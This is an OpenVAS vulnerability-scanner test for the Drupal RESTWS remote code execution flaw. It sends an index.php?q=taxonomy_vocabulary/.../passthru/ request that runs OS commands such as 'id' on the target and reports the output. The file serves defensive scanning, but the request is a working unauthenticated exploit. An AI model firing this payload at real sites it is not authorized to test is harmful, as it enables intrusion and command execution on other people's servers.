###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_drupal_restws_rce_07_16.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Drupal RESTWS Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:drupal:drupal";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105817");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Drupal RESTWS Remote Code Execution");

  script_tag(name:"vuldetect", value:"Try to ececute the `id` command.");

  script_tag(name:"insight", value:"The RESTWS module enables to expose Drupal entities as RESTful web services.
  RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in
  this approach allows an attacker to send specially crafted requests resulting in arbitrary PHP execution.
  There are no mitigating factors. This vulnerability can be exploited by anonymous users.");

  script_tag(name:"summary", value:"The remote Drupal installation is prone to a remote code execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Install the latest version listed in the referenced advisory.");

  script_xref(name:"URL", value:"https://www.drupal.org/node/2765567");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2016-07-20 12:15:23 +0200 (Wed, 20 Jul 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("drupal_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("drupal/installed");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vtstrings = get_vt_strings();
cmds = exploit_commands();

foreach cmd ( keys( cmds ) )
{
  url = dir + '/index.php?q=taxonomy_vocabulary/' + vtstrings["lowercase"] + '/passthru/' + cmds[cmd];
  if( buf = http_vuln_check( port:port, url:url, pattern:cmd ) )
  {
    report = report_vuln_url( port:port, url:url );
    report += '\n\nOutput:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );